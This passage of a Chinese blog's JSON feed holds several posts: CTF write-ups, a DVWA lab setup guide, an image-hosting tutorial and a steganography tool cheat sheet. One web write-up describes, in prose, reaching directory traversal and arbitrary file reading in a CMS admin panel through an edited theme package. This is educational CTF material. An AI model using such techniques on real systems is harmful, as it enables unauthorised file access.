(初级)</h2>\n<p>核心价值观编码</p>\n<h2 id=\"原来你也玩原神-初级\"><a class=\"anchor\" href=\"#原来你也玩原神-初级\">#</a> ▸ 原来你也玩原神 (初级)</h2>\n<p>呃呃，抽象编码</p>\n<p>原神提瓦特文字</p>\n<p><img data-src=\"https://k1nako-images.netlify.app/images/QQ%E6%88%AA%E5%9B%BE20230513194919.png\" alt=\"\" /></p>\n<h2 id=\"家人们谁懂啊rsa签到都不会-初级\"><a class=\"anchor\" href=\"#家人们谁懂啊rsa签到都不会-初级\">#</a> ▸ 家人们！谁懂啊，RSA 签到都不会 (初级)</h2>\n<p><img data-src=\"http://k1nako-images.netlify.app/images/image-20230513195748358.png\" alt=\"image-20230513195748358\" /></p>\n<p>总之就是我也不会，工具梭出来的 hhh</p>\n<h2 id=\"is-this-only-base\"><a class=\"anchor\" href=\"#is-this-only-base\">#</a> ▸ Is this only base?</h2>\n<pre><code>SWZxWl=F=DQef0hlEiSUIVh9ESCcMFS9NF2NXFzM\n今年是本世纪的第23年呢\n</code></pre>\n<p>栅栏密码 23 栏，base64 解码，凯撒密码 23 行</p>\n<h2 id=\"你是我的关键词keyworld-初级\"><a class=\"anchor\" href=\"#你是我的关键词keyworld-初级\">#</a> ▸ 你是我的关键词 (Keyworld) (初级)</h2>\n<pre><code>IFRURC&#123;X0S_YP3_JX_HBXV0PA&#125;\n</code></pre>\n<p>根据题目提示  <code> YOU are my keyworld</code></p>\n<p>应该是关键词密码 (Keywordd Cipher)</p>\n<p>提示中的 YOU 是大写盲猜是密钥，解密得出 flag</p>\n<p><img data-src=\"http://k1nako-images.netlify.app/images/image-20230514113119337.png\" alt=\"image-20230514113119337\" /></p>\n<h1 id=\"reverse\"><a class=\"anchor\" href=\"#reverse\">#</a> Reverse</h1>\n<p>签到题怎么不算题捏～</p>\n<h2 id=\"世界上最棒的程序员\"><a class=\"anchor\" href=\"#世界上最棒的程序员\">#</a> ▸ 世界上最棒的程序员</h2>\n<p>IDA 打开搜索文本 flag 关键词即可 wwwww</p>\n<p><img data-src=\"http://k1nako-images.netlify.app/images/QQ%E6%88%AA%E5%9B%BE20230514120357.png\" alt=\"\" /></p>\n",
            "tags": [
                "CTF Write Up",
                "CTF"
            ]
        },
        {
            "id": "http://k1nako.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1DVWA%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA-%E8%A1%A5%E6%A1%A3/",
            "url": "http://k1nako.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1DVWA%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA-%E8%A1%A5%E6%A1%A3/",
            "title": "记一次 DVWA 靶场搭建",
            "date_published": "2023-04-24T14:23:41.000Z",
            "content_html": "<p>搭建 DVWA 靶场，补档篇系列</p>\n<p><span id=\"more\"></span></p>\n<h1 id=\"1-安装-phpstudy\"><a class=\"anchor\" href=\"#1-安装-phpstudy\">#</a> 1. 安装 PHPStudy</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueHAuY24v\">PHPStudy</span> 是一个 PHP 调试环境的程序集成包。该程序包集成最新的 Apache + PHP + MySQL + phpMyAdmin + ZendOptimizer ，一次性安装，无须配置即可使用，是非常方便、好用的 PHP 调试环境。(点击 phpstudy 进入官网下载)</p>\n<p>安装无脑下一步即可</p>\n<h1 id=\"2-配置-dvwa\"><a class=\"anchor\" href=\"#2-配置-dvwa\">#</a> 2. 配置 DVWA</h1>\n<p>为了之后方便访问，将 DVWA-master 改名为 dvwa</p>\n<p>然后将 dvwa 文件夹放到 phpstudy 配置文件的 www 文件下</p>\n<p><img data-src=\"http://k1nako-images.netlify.app/images/%E6%8D%95%E8%8E%B7.PNG\" alt=\"捕获\" /></p>\n<p>然后在  <code>/www/dvwa/config</code>  里找到 config.inc.php.dist 文件，将其复制一下好做个备份，删掉后缀名的 .dist 后访问里面的配置，修改成这样</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$_DVWA</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$_DVWA</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'db_server'</span> <span class=\"token punctuation\">]</span>   <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'127.0.0.1'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$_DVWA</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'db_database'</span> <span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'dvwa'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$_DVWA</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'db_user'</span> <span class=\"token punctuation\">]</span>     <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'root'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$_DVWA</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'db_password'</span> <span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'root'</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h1 id=\"3-创建-dvwa-网站\"><a class=\"anchor\" href=\"#3-创建-dvwa-网站\">#</a> 3. 创建 DVWA 网站</h1>\n<p>打开 phpstudy 启动 apache mysql5.7 服务</p>\n<p>点击创建网站</p>\n<p>输入域名，修改端口防止冲突，根目录选择 dvwa 的目录</p>\n<p><img data-src=\"http://k1nako-images.netlify.app/images/%E6%8D%95%E8%8E%B72.PNG\" alt=\"捕获2\" /></p>\n<p>随后打开浏览器访问这个域名</p>\n<p><img data-src=\"http://k1nako-images.netlify.app/images/%E6%8D%95%E8%8E%B73.PNG\" alt=\"捕获3\" /></p>\n<p>点击 Create / Reset Database 创建 dvwa 数据库</p>\n<p><img data-src=\"http://k1nako-images.netlify.app/images/%E6%8D%95%E8%8E%B74.PNG\" alt=\"捕获4\" /></p>\n<p>显示这一串即可成功创建，点击 login 访问登陆界面</p>\n<p>默认账号密码为 admin password</p>\n<h1 id=\"4-介绍-dvwa\"><a class=\"anchor\" href=\"#4-介绍-dvwa\">#</a> 4. 介绍 DVWA</h1>\n<p>找到左边栏的 DVWA Security</p>\n<p><img data-src=\"http://k1nako-images.netlify.app/images/%E6%8D%95%E8%8E%B75.PNG\" alt=\"捕获5\" /></p>\n<p><img data-src=\"http://k1nako-images.netlify.app/images/%E6%8D%95%E8%8E%B76.PNG\" alt=\"捕获6\" /></p>\n<p>这里是更改难度的配置</p>\n<pre><code>Low //低\nMedium //中\nHigh //高\nImpossible //不可能(这是已经防护完全的难度，即不可解)\n</code></pre>\n<h5 id=\"dvwa-中包含的-web-漏洞\"><a class=\"anchor\" href=\"#dvwa-中包含的-web-漏洞\">#</a> DVWA 中包含的 web 漏洞</h5>\n<pre><code>暴力破解：HTTP表单暴力破解登录页面；用来测试密码暴力破解工具，展示弱口令的不安全性。\n\n命令执行：在底层操作系统上执行命令。\n\n伪造跨站请求：启动一个“攻击者”更改应用的管理员密码。\n\n文件包含：允许“攻击者”将远程/本地文件包含到Web应用程序中。\n\nSQL注入：启动一个“攻击者”将SQL语句注入到HTTP表单的输入框中，DVWA包括基于盲（盲注）和错误的SQL注入。\n\n不安全文件上传：允许“攻击者”将恶意文件上传到web服务器。\n\n跨站脚本（XSS）：“攻击者”可以将自己编写的脚本注入到web应用或数据库中，DVWA包含反射型和存储型XSS。\n</code></pre>\n",
            "tags": [
                "教程"
            ]
        },
        {
            "id": "http://k1nako.github.io/%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A/",
            "url": "http://k1nako.github.io/%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A/",
            "title": "搭建图床",
            "date_published": "2023-04-20T15:32:20.000Z",
            "content_html": "<p>PicGo + Github + Typora 方式自建图床</p>\n<p><span id=\"more\"></span></p>\n<h1 id=\"1-安装-picgo\"><a class=\"anchor\" href=\"#1-安装-picgo\">#</a> 1. 安装 PicGo</h1>\n<p>我们用 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL01vbHVuZXJmaW5uL1BpY0dvL3JlbGVhc2Vz\">PicGo</span> + Github 方式自建图床</p>\n<h1 id=\"2-创建-github-仓库\"><a class=\"anchor\" href=\"#2-创建-github-仓库\">#</a> 2. 创建 Github 仓库</h1>\n<p>Github 首页点击 new 新建仓库，注意必须是 Public 仓库，而且要加一个 README</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Initialize this repository with a README.</pre></td></tr></table></figure><h1 id=\"3-创建-token\"><a class=\"anchor\" href=\"#3-创建-token\">#</a> 3. 创建 Token</h1>\n<p>去 github 创建<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NldHRpbmdzL3Rva2Vucy9uZXc=\"> Token</span>（点击这里前往）</p>\n<p><img data-src=\"https://k1nako-images.netlify.app/images/QQ%E6%88%AA%E5%9B%BE20230421001743.png\" alt=\"\" /></p>\n<p>创建完后会提示你 Token 创建成功，记得保存并复制下来</p>\n<h1 id=\"4-配置-picgo\"><a class=\"anchor\" href=\"#4-配置-picgo\">#</a> 4. 配置 PicGo</h1>\n<p>打开 PicGo ，找到图床 Github 设置</p>\n<p><img data-src=\"http://k1nako-images.netlify.app/images/image-20230421002424643.png\" alt=\"image-20230421002424643\" /></p>\n<p>注意一下 Github 仓库的分支名，如果你默认分支为  <code>master</code>  记得更改即可</p>\n<h1 id=\"5-netlify-加速\"><a class=\"anchor\" href=\"#5-netlify-加速\">#</a> 5. Netlify 加速</h1>\n<p>Github 访问会比较慢，所以推荐使用 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubmV0bGlmeS5jb20v\">Netlify</span> 加速一下</p>\n<p>先注册一个 Netlify 账号，通过 Github 账号注册即可</p>\n<p>注册成功后会跳转到你的首页，点击 Add new site 中的 Import an existing project，点击 GitHub，与 GitHub 关联</p>\n<p>关联好 Github 后在下面会出现你的 Github 仓库，点击创建好的图床仓库，再点击 Deploy site 上传</p>\n<p>上传完成会跳转到项目主页，选择 Site settings，跳转后往下滑，点击 Change site name 更改你网站的名称</p>\n<h1 id=\"6-typora-上传图床\"><a class=\"anchor\" href=\"#6-typora-上传图床\">#</a> 6. Typora 上传图床</h1>\n<p><a href=\"(https://typoraio.cn/)\">Typora</a> 是一款 Markdown 编辑器和阅读器，Markdown 是用来编写结构化文档的一种纯文本格式</p>\n<p>（安装请点击 Typora 跳转安装）</p>\n<p>打开 Typora 偏好设置</p>\n<p><img data-src=\"http://k1nako-images.netlify.app/images/image-20230421004625621.png\" alt=\"image-20230421004625621\" /></p>\n<p>点击图像设置，选择上传图片，勾选下面三个选项，上传服务选择之前搭建好的 PicGo 和 PicGo 的安装路径</p>\n<p>最后点击验证图片上传选项，验证图片是否上传成功</p>\n",
            "tags": [
                "教程",
                "教程"
            ]
        },
        {
            "id": "http://k1nako.github.io/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AFweb%E9%83%A8%E5%88%86wp/",
            "url": "http://k1nako.github.io/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AFweb%E9%83%A8%E5%88%86wp/",
            "title": "第三届红明谷杯web部分wp",
            "date_published": "2023-04-19T10:08:53.000Z",
            "content_html": "<p>只会点 web 题，还是太菜了</p>\n<p><span id=\"more\"></span></p>\n<p>因为环境关闭了，有一些截图借用了其他师傅的截图 (</p>\n<h1 id=\"点击签到\"><a class=\"anchor\" href=\"#点击签到\">#</a> 点击签到</h1>\n<p>一直点，点到出 flag 为止</p>\n<h1 id=\"dreamer\"><a class=\"anchor\" href=\"#dreamer\">#</a> Dreamer</h1>\n<p>用 dirb 或 dirsearch 扫描目录工具扫</p>\n<p>扫出 admin 后台，根据附件找到账号密码登陆到后台界面</p>\n<p>找到添加栏目，实现目录遍历</p>\n<p><img data-src=\"https://k1nako-images.netlify.app/images/QQ%E6%88%AA%E5%9B%BE20230419181413.png\" alt=\"\" /></p>\n<p><img data-src=\"https://k1nako-images.netlify.app/images/QQ%E5%9B%BE%E7%89%8720230419181704.png\" alt=\"\" /></p>\n<p>然后去前端访问一遍这个栏目，即可获取 flag</p>\n<p><img data-src=\"https://k1nako-images.netlify.app/images/QQ%E6%88%AA%E5%9B%BE20230419181755.png\" alt=\"\" /></p>\n<h1 id=\"dreamer_revenge\"><a class=\"anchor\" href=\"#dreamer_revenge\">#</a> Dreamer_revenge</h1>\n<p>跟上题一样，访问后台，上一题的 flag 已经被删。尝试其他路线</p>\n<p>在附件中找到主题包文件，更改 theme.json，将目录改成根目录</p>\n<p><img data-src=\"https://k1nako-images.netlify.app/images/QQ%E6%88%AA%E5%9B%BE20230419182053.png\" alt=\"\" /></p>\n<p><img data-src=\"https://k1nako-images.netlify.app/images/QQ%E6%88%AA%E5%9B%BE20230419182141.png\" alt=\"\" /></p>\n<p>然后再后台风格管理上，上传更改后的主题包</p>\n<p><img data-src=\"https://k1nako-images.netlify.app/images/QQ%E6%88%AA%E5%9B%BE20230419182005.png\" alt=\"\" /></p>\n<p>点击启用</p>\n<p><img data-src=\"https://k1nako-images.netlify.app/images/QQ%E6%88%AA%E5%9B%BE20230419182254.png\" alt=\"\" /></p>\n<p>然后再模板管理这里查看发现，目录已经成了根目录的位置，可以读取到所用文件的内容，也可进行修改</p>\n<p><img data-src=\"https://k1nako-images.netlify.app/images/QQ%E5%9B%BE%E7%89%8720230419182336.png\" alt=\"\" /></p>\n<p>最后在 <code>/var/lib/redis/dump.rdb</code>  的最底下找到 flag</p>\n<p><img data-src=\"https://k1nako-images.netlify.app/images/QQ%E6%88%AA%E5%9B%BE20230419182543.png\" alt=\"\" /></p>\n",
            "tags": [
                "CTF Write Up",
                "CTF"
            ]
        },
        {
            "id": "http://k1nako.github.io/misc%E7%BB%BC%E5%90%88/",
            "url": "http://k1nako.github.io/misc%E7%BB%BC%E5%90%88/",
            "title": "misc综合",
            "date_published": "2023-04-17T14:07:42.000Z",
            "content_html": "<p>记录一下我之前做 misc 时碰到的各种工具和小知识</p>\n<p><span id=\"more\"></span></p>\n<p>其中有些工具之后会出文章详细讲解。<br />\n图片之后会补)</p>\n<hr />\n<h1 id=\"文件格式的文件头文件尾\"><a class=\"anchor\" href=\"#文件格式的文件头文件尾\">#</a> 文件格式的文件头文件尾</h1>\n<h2 id=\"jpeg-jpg\"><a class=\"anchor\" href=\"#jpeg-jpg\">#</a> JPEG (jpg)</h2>\n<p>文件头：FFD8FFE1</p>\n<p>文件尾：FF D9</p>\n<p>FFD8FFE000, .JPEG;.JPE;.JPG, “JPGGraphic File”</p>\n<h2 id=\"png-png\"><a class=\"anchor\" href=\"#png-png\">#</a> PNG (png)</h2>\n<p>文件头：89504E47</p>\n<p>文件尾：49454E44 AE 42 60 82</p>\n<h2 id=\"gif\"><a class=\"anchor\" href=\"#gif\">#</a> GIF</h2>\n<p>文件头：47494638   文件尾：50 4B</p>\n<p>GIF89a 474946383961  文件尾：50 4B</p>\n<p>GIF87a 474946383761   文件尾：50 4B</p>\n<h2 id=\"tiff-tif\"><a class=\"anchor\" href=\"#tiff-tif\">#</a> TIFF (tif)</h2>\n<p>文件头：49492A00</p>\n<h2 id=\"riff\"><a class=\"anchor\" href=\"#riff\">#</a> RIFF</h2>\n<p>文件头：52494646</p>\n<h2 id=\"zip-zip\"><a class=\"anchor\" href=\"#zip-zip\">#</a> ZIP (zip)</h2>\n<p>文件头：504B0304</p>\n<h2 id=\"rar-rar\"><a class=\"anchor\" href=\"#rar-rar\">#</a> RAR (rar)</h2>\n<p>文件头：526172211A0700</p>\n<p>文件尾：3D7B00400700</p>\n<h2 id=\"7z\"><a class=\"anchor\" href=\"#7z\">#</a> 7z</h2>\n<p>文件头：377a</p>\n<p>37 7A BC AF 27 1C</p>\n<h2 id=\"wave-wav\"><a class=\"anchor\" href=\"#wave-wav\">#</a> Wave (wav)</h2>\n<p>文件头：57415645</p>\n<h2 id=\"avi-avi\"><a class=\"anchor\" href=\"#avi-avi\">#</a> AVI (avi)</h2>\n<p>文件头：41564920</p>\n<h2 id=\"pdf\"><a class=\"anchor\" href=\"#pdf\">#</a> PDF</h2>\n<p>文件头：255044462D312E</p>\n<h2 id=\"html-html\"><a class=\"anchor\" href=\"#html-html\">#</a> HTML (html)</h2>\n<p>文件头：68746D6C3E</p>\n<h2 id=\"bmp\"><a class=\"anchor\" href=\"#bmp\">#</a> BMP</h2>\n<p>文件头：424D</p>\n<h2 id=\"ms-wordexcel-xls-doc-ppt-msi-msg\"><a class=\"anchor\" href=\"#ms-wordexcel-xls-doc-ppt-msi-msg\">#</a> MS Word/Excel (xls、doc、ppt、msi、msg)</h2>\n<p>文件头：D0 CF 11 E0</p>\n<p>D0CF11E0</p>\n<h2 id=\"cad-dwg\"><a class=\"anchor\" href=\"#cad-dwg\">#</a> CAD (dwg)</h2>\n<p>文件头：41 43 31 30</p>\n<h2 id=\"adobe-photoshop-psd\"><a class=\"anchor\" href=\"#adobe-photoshop-psd\">#</a> Adobe Photoshop (psd)</h2>\n<p>文件头：38 42 50 53</p>\n<h2 id=\"xml-xml\"><a class=\"anchor\" href=\"#xml-xml\">#</a> XML (xml)</h2>\n<p>文件头：3C 3F 78 6D 6C</p>\n<h1 id=\"图片隐写工具\"><a class=\"anchor\" href=\"#图片隐写工具\">#</a> <strong>图片隐写工具</strong></h1>\n<h2 id=\"分离工具\"><a class=\"anchor\" href=\"#分离工具\">#</a> 分离工具</h2>\n<p>binwalk -e xxxx</p>\n<p>foremost xxxx</p>\n<p>dd if=xxxx.jpg of=out.jpg skip=DECIMAL (配合 binwalk 使用) bs=1</p>\n<h2 id=\"steghide\"><a class=\"anchor\" href=\"#steghide\">#</a> Steghide</h2>\n<p>（检查图片隐写）</p>\n<p>steghide info out.jpg 查看嵌入信息</p>\n<p>steghide extract -sf out.jpg -p passwd (可无密码)</p>\n<h2 id=\"stegdetect\"><a class=\"anchor\" href=\"#stegdetect\">#</a> Stegdetect</h2>\n<p>(检查 jpg 隐写)</p>\n<p>stegdetect.exe -tjopi -s 10.0 [stego_file]</p>\n<p>jsteg、outguess、jphide、invisible secrets</p>\n<h2 id=\"snow\"><a class=\"anchor\" href=\"#snow\">#</a> SNOW</h2>\n<p>（txt 看不到数据可用，需密码）</p>\n<p>snow.exe -p passwd -C out.txt</p>\n<p>在线：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9mb2cubWlzdHkuY29tL3BlcnJ5L2Njcy9zbm93L3Nub3cvc25vdy5odG1s\">Snow web-page encryption/decryption (misty.com)</span></p>\n<h2 id=\"tweakpng\"><a class=\"anchor\" href=\"#tweakpng\">#</a> Tweakpng</h2>\n<p>修改图片数据块</p>\n<h2 id=\"jphs05\"><a class=\"anchor\" href=\"#jphs05\">#</a> Jphs05</h2>\n<p>jpg 隐写</p>\n<h2 id=\"npiet\"><a class=\"anchor\" href=\"#npiet\">#</a> Npiet</h2>\n<p>关键字：抽象</p>\n<p>npiet.exe -tpic 图片</p>\n<h2 id=\"outguess\"><a class=\"anchor\" href=\"#outguess\">#</a> Outguess</h2>\n<p>加密：</p>\n<p>outguess -k &quot;my secret key&quot; -d hidden.txt demo.jpg out.jpg</p>\n<p>加密之后，demo.jpg 会覆盖 out.jpg,</p>\n<p>hidden.txt 中的内容是要隐藏的东西</p>\n<p>解密：</p>\n<p>outguess -k &quot;my secret key&quot; -r out.jpg out.txt (有 key)</p>\n<p>outguess -r out.jpg out.txt (无 key)</p>\n<p>-k 密码 -t 输出 -r 解压</p>\n<p>解密之后，解密内容放在 out.txt 中</p>\n<h2 id=\"f5-steganography\"><a class=\"anchor\" href=\"#f5-steganography\">#</a> F5-steganography</h2>\n<p>binwalk 检查无后门可用</p>\n<p>java Extract 图片路径 (无 key)</p>\n<p>java Extract 图片路径 -p passwd (有 key)</p>\n<p>检查 output.txt</p>\n<h2 id=\"cloacked-pixel\"><a class=\"anchor\" href=\"#cloacked-pixel\">#</a> Cloacked-pixel</h2>\n<p>python2 -m pip install numpy</p>\n<p>加密：</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL2xzYi5weQ==\">lsb.py</span> hide big.png 1.txt 123456</p>\n<p>hide: 表示加密模式，big.png: 待加密的 png 图片，1.txt: 存放 payload;</p>\n<p>解密：</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL2xzYi5weQ==\">lsb.py</span> extract 1.png 3.txt 123456</p>\n<p>extract: 表示解密模式，1.png: 待解密的 png 图片，3.txt: 存放</p>\n<h2 id=\"file\"><a class=\"anchor\" href=\"#file\">#</a> File</h2>\n<p>linux 查看文件格式</p>\n<h2 id=\"zsteg\"><a class=\"anchor\" href=\"#zsteg\">#</a> Zsteg</h2>\n<p>1. 查看 lsb 数据</p>\n<p>zsteg xxx.bmp</p>\n<p>zsteg xxx.png</p>\n<p>zsteg -a (文件名)    #查看各个通道的 lsb</p>\n<p>2. 检测 zlib</p>\n<p>#-b 的位数是从 1 开始的</p>\n<p>zsteg zlib.bmp -b 1 -o xy -v</p>\n<p>3. 提取该通道图片</p>\n<p>zsteg -e b8,a,lsb,xy 文件.png -&gt; out.png</p>\n<h2 id=\"silenteye\"><a class=\"anchor\" href=\"#silenteye\">#</a> SilentEye</h2>\n<p>图片、音频隐写</p>\n<h2 id=\"free-file-camouflage\"><a class=\"anchor\" href=\"#free-file-camouflage\">#</a> Free file Camouflage</h2>\n<p>图片伪装</p>\n<h2 id=\"stegpy\"><a class=\"anchor\" href=\"#stegpy\">#</a> Stegpy</h2>\n<p><code>stegpy</code>  是一种将编码信息隐写在图像和<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT0lRTklOUYlQjMlRTklQTIlOTEmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw\">音频</span>文件中的程序。使用 Python 编写</p>\n<p>pip3 install stegpy</p>\n<p>然后下载<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Roc2RzaGRoay9zdGVncHk=\">工具源码</span>解压</p>\n<p>sudo python3 <span class=\"exturl\" data-url=\"aHR0cDovL3NldHVwLnB5\">setup.py</span> install</p>\n<p>stegpy 隐写内容 XXX.jpg\t加密</p>\n<p>stegpy xxxx.jpg -p \t解密</p>\n<h2 id=\"imagein\"><a class=\"anchor\" href=\"#imagein\">#</a> ImageIN</h2>\n<p>文件隐藏在图片里的工具</p>\n<h2 id=\"oursecret\"><a class=\"anchor\" href=\"#oursecret\">#</a> OurSecret</h2>\n<p>关键词：秘密</p>\n<p>文件加密，需要密码</p>\n<h1 id=\"lsb隐写\"><a class=\"anchor\" href=\"#lsb隐写\">#</a> LSB 隐写</h1>\n<h2 id=\"stegsolve\"><a class=\"anchor\" href=\"#stegsolve\">#</a> Stegsolve</h2>\n<h2 id=\"lsb脚本\"><a class=\"anchor\" href=\"#lsb脚本\">#</a> LSB 脚本</h2>\n<p>cloacked-pixel-master</p>\n<p>python2 <span class=\"exturl\" data-url=\"aHR0cDovL2xzYi5weQ==\">lsb.py</span> extract 1.png 1.txt passwd  (解密)</p>\n<p>python2 <span class=\"exturl\" data-url=\"aHR0cDovL2xzYi5weQ==\">lsb.py</span> hide 1.png 1.txt passwd (加密)</p>\n<h1 id=\"音频隐写工具\"><a class=\"anchor\" href=\"#音频隐写工具\">#</a> 音频隐写工具</h1>\n<h2 id=\"silenteye-2\"><a class=\"anchor\" href=\"#silenteye-2\">#</a> SilentEye</h2>\n<p>图片、wav 隐写</p>\n<p>切换到「De-camouflage a file」选项卡，在 “Jpeg image to de-camouflage” 中浏览到要解除伪装的图片</p>\n<p>并在 “Destination directory-save decrypted file to:” 选择要保存的位置。按 “De-Camouflage!” 解除伪装。</p>\n<h2 id=\"deepsound\"><a class=\"anchor\" href=\"#deepsound\">#</a> deepsound</h2>\n<p>wav 隐写</p>\n<h2 id=\"audacity\"><a class=\"anchor\" href=\"#audacity\">#</a> Audacity</h2>\n<h2 id=\"mp3stego\"><a class=\"anchor\" href=\"#mp3stego\">#</a> MP3Stego</h2>\n<p>Decode.exe -X -P passwd x.mp3</p>\n<h2 id=\"qsstv\"><a class=\"anchor\" href=\"#qsstv\">#</a> QSSTV</h2>\n<p>kali 自带的音频解码工具</p>\n<p>打开图片，然后 start</p>\n<h1 id=\"word隐写\"><a class=\"anchor\" href=\"#word隐写\">#</a> WORD 隐写</h1>\n<p>文字颜色、文字隐藏</p>\n<h1 id=\"pdfhtmlbmptxt隐写\"><a class=\"anchor\" href=\"#pdfhtmlbmptxt隐写\">#</a> PDF\\html\\bmp\\txt 隐写</h1>\n<h2 id=\"wbstego4\"><a class=\"anchor\" href=\"#wbstego4\">#</a> wbstego4</h2>\n<p>1：点击 Continue，进入开始阶段，decode（解码）</p>\n<p>2：选择 PDF 文件</p>\n<p>3：选择需要隐藏的载体文件，并进行隐藏</p>\n<h1 id=\"盲水印\"><a class=\"anchor\" href=\"#盲水印\">#</a> 盲水印</h1>\n<h2 id=\"watermark\"><a class=\"anchor\" href=\"#watermark\">#</a> WaterMark</h2>\n<h2 id=\"blindwatermark\"><a class=\"anchor\" href=\"#blindwatermark\">#</a> BlindWaterMark</h2>\n<p>特征：相同的两张图片</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL2J3bS5weQ==\">bwm.py</span> decode 1.png 2.png flag.png</p>\n<p>1.png 为无水印原图</p>\n<p>2.png 为有盲水印的图片</p>\n<p>flag.png 为解出来的图片</p>\n<h1 id=\"图片拼接\"><a class=\"anchor\" href=\"#图片拼接\">#</a> 图片拼接</h1>\n<h2 id=\"montage\"><a class=\"anchor\" href=\"#montage\">#</a> Montage</h2>\n<p>montage ./flag/*.png -tile 16x16 -geometry +0+0 flag02.png</p>\n<p>16* 16 为图片个数</p>\n<p>与 gaps 结合使用</p>\n<h2 id=\"gaps\"><a class=\"anchor\" href=\"#gaps\">#</a> Gaps</h2>\n<p>gaps --image=flag02.png --size=64 --save</p>\n<p>64 为小图片的宽和高</p>\n<h2 id=\"在线合并图片\"><a class=\"anchor\" href=\"#在线合并图片\">#</a> 在线合并图片</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jZGttLmNvbS9jbi9tZXJnZS1pbWFnZQ==\">在线合并 JPG、PNG、SVG、WEBP 图片 (cdkm.com)</span></p>\n<h1 id=\"二维码扫描\"><a class=\"anchor\" href=\"#二维码扫描\">#</a> 二维码扫描</h1>\n<h2 id=\"qrazybox\"><a class=\"anchor\" href=\"#qrazybox\">#</a> Qrazybox</h2>\n<p>二维码在线扫描工具</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZXJyaWN4LmdpdGh1Yi5pby9xcmF6eWJveC8=\">https://merricx.github.io/qrazybox/</span></p>\n<h2 id=\"二维码在线扫\"><a class=\"anchor\" href=\"#二维码在线扫\">#</a> 二维码在线扫</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96eGluZy5vcmcvdy9kZWNvZGUuanNweA==\">ZXing Decoder Online</span></p>\n<h2 id=\"pyzbar\"><a class=\"anchor\" href=\"#pyzbar\">#</a> Pyzbar</h2>\n<p>批量解码处理脚本</p>\n<h2 id=\"processing\"><a class=\"anchor\" href=\"#processing\">#</a> Processing</h2>\n<p>二进制转二维码</p>\n<h2 id=\"cqr\"><a class=\"anchor\" href=\"#cqr\">#</a> CQR</h2>\n<p>二维码扫描工具</p>\n<h2 id=\"gnuplot\"><a class=\"anchor\" href=\"#gnuplot\">#</a> Gnuplot</h2>\n<p>坐标转换格式后画二维码工具</p>\n<p>转换 ASCII 后使用</p>\n<p>plot '1.txt'</p>\n<h2 id=\"二维码反色\"><a class=\"anchor\" href=\"#二维码反色\">#</a> 二维码反色</h2>\n<p>打开 photoshop</p>\n<p>Ctrl + i</p>\n<p>一键反色图片</p>\n<h1 id=\"各种二维码\"><a class=\"anchor\" href=\"#各种二维码\">#</a> 各种二维码</h1>\n<h2 id=\"qr-code\"><a class=\"anchor\" href=\"#qr-code\">#</a> QR Code</h2>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221205221705040.png\" alt=\"image-20221205221705040\" /></p>\n<h2 id=\"data-matrix\"><a class=\"anchor\" href=\"#data-matrix\">#</a> Data Matrix</h2>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221205221726295.png\" alt=\"image-20221205221726295\" /></p>\n<h2 id=\"pdf417码\"><a class=\"anchor\" href=\"#pdf417码\">#</a> PDF417 码</h2>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221205221806646.png\" alt=\"image-20221205221806646\" /></p>\n<h2 id=\"汉信码\"><a class=\"anchor\" href=\"#汉信码\">#</a> 汉信码</h2>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221205221823190.png\" 